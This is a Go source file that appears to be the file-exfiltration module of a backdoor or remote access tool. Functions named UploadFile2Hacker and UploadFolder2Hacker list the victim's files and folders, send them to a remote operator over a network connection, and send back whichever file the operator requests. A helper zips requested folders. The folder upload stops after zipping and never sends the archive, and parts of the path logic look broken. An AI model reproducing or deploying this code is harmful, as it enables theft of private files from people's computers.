package upload

import (
	"archive/zip"
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"
)

type FilesList struct {
	Files []string
}

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func readFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("[-] Unable to open file")
		return nil, err
	}
	defer file.Close()

	stats, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Unable to stat file: ", err)
	}
	fileSize := stats.Size()
	fmt.Println("[+] the file contains ", fileSize, " bytes")

	bytes := make([]byte, fileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)
	if err != nil {
		fmt.Println(err)
	}

	return bytes, nil
}

func UploadFile2Hacker(connection net.Conn) (err error) {

	// get list of file in pwd

	var files []string
	filesArr, err := os.ReadDir(".")
	if err != nil {
		fmt.Println("[-] Failed to read directory: ", err)
	}
	for index, file := range filesArr {
		mode := file.Type()
		if mode.IsRegular() {
			files = append(files, file.Name())
			fmt.Println("\t ", index, "\t", file.Name())
		}
	}
	filesList := &FilesList{Files: files}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(filesList)
	if err != nil {
		fmt.Println(err)
	}

	reader := bufio.NewReader(connection)
	fileName2downloadRaw, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}

	fileName2download := strings.TrimSuffix(fileName2downloadRaw, "\n")

	contents, err := readFileContents(fileName2download)
	if err != nil {
		fmt.Println(err)
	}

	fs := &FileStruct{
		FileName:    fileName2download,
		FileSize:    len(contents),
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)
	err = encoder.Encode(fs)
	if err != nil {
		fmt.Println(err)
	}

	return
}

func ZipWritter(baseFolder, outputFileName string) {
	OutFile, err := os.Create(outputFileName)
	if err != nil {
		fmt.Println(err)
	}
	defer OutFile.Close()

	ZipWritter := zip.NewWriter(OutFile)

	AddFilesToZip(ZipWritter, baseFolder, "") // todo:

	err = ZipWritter.Close()
	if err != nil {
		fmt.Println("Unable to close zip: ", err)
	}
}

func AddFilesToZip(ZipWritter *zip.Writer, basePath string, baseInZip string) {
	files, err := os.ReadDir(basePath)
	if err != nil {
		fmt.Println("failed to read dir: ", err)
	}

	for _, file := range files {
		fmt.Println("[+] ", basePath+file.Name())
		if !file.IsDir() {
			data, err := os.ReadFile(basePath + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			f, err := ZipWritter.Create(baseInZip + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			_, err = f.Write(data)
			if err != nil {
				fmt.Println("[-] Failed to write in zip: ", err)
			}

		} else if file.IsDir() {

			// Recurce
			newBase := baseInZip + "/" + file.Name()
			fmt.Println("Adding SubDir: ", file.Name())
			fmt.Println("Adding SubDir: ", newBase)

			AddFilesToZip(ZipWritter, newBase, baseInZip+file.Name()+"/")
		}
	}

}

func UploadFolder2Hacker(connection net.Conn) (err error) {
	rootDir := "."

	folders := []string{}

	elements, err := os.ReadDir(rootDir)
	if err != nil {
		fmt.Println("[-] Failed to read directory: ", err)
	}

	for index, file := range elements {
		if file.IsDir() {
			fmt.Println("\t", index, "\t", file.Name())
			folders = append(folders, file.Name())
		}
	}

	filesList := &FilesList{Files: folders}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(filesList)
	if err != nil {
		fmt.Println(err)
	}

	reader := bufio.NewReader(connection)
	folderName2downloadRaw, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}

	folderName2download := strings.TrimSuffix(folderName2downloadRaw, "\n")
	ZipWritter(folderName2download, folderName2download+".zip")

	return
}
